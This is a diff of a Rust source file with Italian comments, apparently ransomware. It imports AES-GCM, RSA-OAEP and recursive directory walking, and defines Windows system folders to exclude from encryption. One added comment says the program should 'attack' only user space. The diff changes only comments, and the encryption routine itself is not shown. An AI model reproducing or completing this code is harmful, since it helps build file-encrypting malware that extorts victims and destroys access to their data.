@@ -1,22 +1,25 @@
-// Importa i trait necessari per usare AES-GCM
+// importa i trait necessari per usare AES-GCM - i traid sono un insieme di metodi che un tipo puo
+// implementare, infatti importo AES-GCM ma devo chiamare i trait Aead e KeyInit che servono ad
+// esempio a richiamare gli encrypt(), decrypt(), etc...
 use aes_gcm::aead::{Aead, KeyInit};
-// Importa il tipo AES256GCM, la chiave e il nonce
+// importa il tipo AES256GCM, la chiave e il nonce
 use aes_gcm::{Aes256Gcm, Key, Nonce};
-// Importa generatori casuali
+// importa generatori casuali
 use rand::{RngCore, thread_rng};
-// Importa i moduli RSA, inclusa la decodifica di chiavi private in formato PKCS#8
+// importa i moduli RSA, inclusa la decodifica di chiavi private in formato PKCS#8
 use rsa::{Oaep, RsaPrivateKey, RsaPublicKey, pkcs8::DecodePrivateKey, pkcs8::DecodePublicKey};
 // Importa SHA256 per l'OAEP padding
 use sha2::Sha256;
-// Importa moduli standard per gestione file, errori, path
+// moduli standard per gestione file, errori, path
 use std::error::Error;
 use std::fs::{self, File};
 use std::io::{BufWriter, Write};
 use std::path::{Path, PathBuf};
-// Per camminare ricorsivamente nella directory
+// per scorrere ricorsivamente nella directory
 use walkdir::WalkDir;
 
-// Lista delle directory da escludere dalla cifratura (in minuscolo e in stile Windows)
+// lista delle directory da escludere dalla cifratura (in minuscolo e in stile Windows), dovrebbe
+// attaccare solo la User space
 const EXCLUDED_DIRS: [&str; 5] = [
     "\\windows\\",
     "\\program files\\",
